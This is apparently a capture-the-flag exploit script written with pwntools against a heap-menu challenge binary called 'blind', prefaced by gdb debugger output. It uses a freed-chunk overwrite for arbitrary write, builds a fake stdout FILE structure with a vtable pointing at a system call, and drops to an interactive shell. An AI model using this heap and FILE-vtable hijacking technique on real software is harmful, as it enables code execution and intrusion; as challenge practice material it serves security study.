#/usr/bin/env python
'''
aha, printf will use stdout declared in the program, 
strange again? Isn't it?

   0x7ffff7a62885 <__printf+133>:	mov    QWORD PTR [rsp+0x18],rax
   0x7ffff7a6288a <__printf+138>:	mov    rax,QWORD PTR [rip+0x36e6bf]        # 0x7ffff7dd0f50
   0x7ffff7a62891 <__printf+145>:	mov    rdi,QWORD PTR [rax]
=> 0x7ffff7a62894 <__printf+148>:	call   0x7ffff7a5a170 <_IO_vfprintf_internal>
   0x7ffff7a62899 <__printf+153>:	add    rsp,0xd8
   0x7ffff7a628a0 <__printf+160>:	ret    
   0x7ffff7a628a1:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x7ffff7a628ab:	nop    DWORD PTR [rax+rax*1+0x0]
Guessed arguments:
arg[0]: 0x7ffff7dd2620 --> 0xfbad2887 
arg[1]: 0x400d6c --> 0x3a6563696f6843 ('Choice:')
arg[2]: 0x7fffffffda48 --> 0x3000000008 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffda40 --> 0x7ffff7fd2700 (0x00007ffff7fd2700)
0008| 0x7fffffffda48 --> 0x3000000008 
0016| 0x7fffffffda50 --> 0x7fffffffdb20 --> 0x7fffffffdb60 --> 0x400cc0 (push   r15)
0024| 0x7fffffffda58 --> 0x7fffffffda60 --> 0x0 
0032| 0x7fffffffda60 --> 0x0 
0040| 0x7fffffffda68 --> 0x7ffff7dd26a3 --> 0xdd3780000000000a 
0048| 0x7fffffffda70 --> 0x7ffff7dd3780 --> 0x0 
0056| 0x7fffffffda78 --> 0x7ffff7b042c0 (<__write_nocancel+7>:	cmp    rax,0xfffffffffffff001)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gef>  x/gx 0x7ffff7dd0f50
0x7ffff7dd0f50:	0x0000000000602020 
'''
from pwn import *
import sys

debug = 0

if len(sys.argv) == 2:
	p = remote('', 0)
if len(sys.argv) == 1:
	p = process('./blind')
if len(sys.argv) == 3:
	p = process('./blind')
	debug = 1

def new(index, content):
	p.sendlineafter("Choice:", str(1))
	p.sendlineafter("Index:", str(index))
	p.sendlineafter("Content:", content)

def change(index, content):
	p.sendlineafter("Choice:", str(2))
	p.sendlineafter("Index:", str(index))
	#sleep(1)
	p.sendlineafter("Content:", content)

def release(index):
	p.sendlineafter("Choice:", str(3))
	p.sendlineafter("Index:", str(index))

call_system = 0x4008E3
'''
turn the arbitrary-write as a more usuall way
'''
new(0, "aaaa")
release(0)
change(0, p64(0x60201d))
new(1, "bbbb")
new(2, "cccc")  #get target area

change(2, '111' + '2'*0x30 + p64(0x602060))

'''
make a fake file structure @0x602200
vtable @0x602300
'''
file = p64(0xfbada887).ljust(0xd8, "\x00")
file += p64(0x602300) #vtable

change(0, p64(0x602060) + p64(0x602200))
'''
the flag of stdout is necessary
it will be checked in the functions of vtable.
'''
change(1, p64(0xfbada887)) 

change(0, p64(0x602060) + p64(0x6022d8))
change(1, p64(0x602300))

change(0, p64(0x602060) + p64(0x602300))
change(1, p64(call_system)*12)

change(0, p64(0x602060) + p64(0x602020))
change(1, p64(0x602200))
if debug:
	gdb.attach(p)

#p.sendlineafter("Choice:", str(2))

p.interactive()
